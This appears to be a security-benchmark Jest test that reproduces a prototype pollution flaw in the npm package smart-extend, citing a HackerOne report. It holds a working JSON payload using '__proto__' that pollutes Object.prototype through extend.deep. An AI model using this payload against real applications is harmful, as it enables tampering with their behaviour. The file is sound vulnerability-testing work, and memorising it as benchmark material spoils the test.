//https://hackerone.com/reports/438274

test("prototype pollution in smart-extend", () => {
  var extend = require("smart-extend");
  obj = {};

  expect({}.polluted).toBe(undefined);
  var payload = process.env.SECBENCH_PAYLOAD || (process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');

  extend.deep({}, JSON.parse(payload));
  expect({}.polluted).toBe("yes");
});
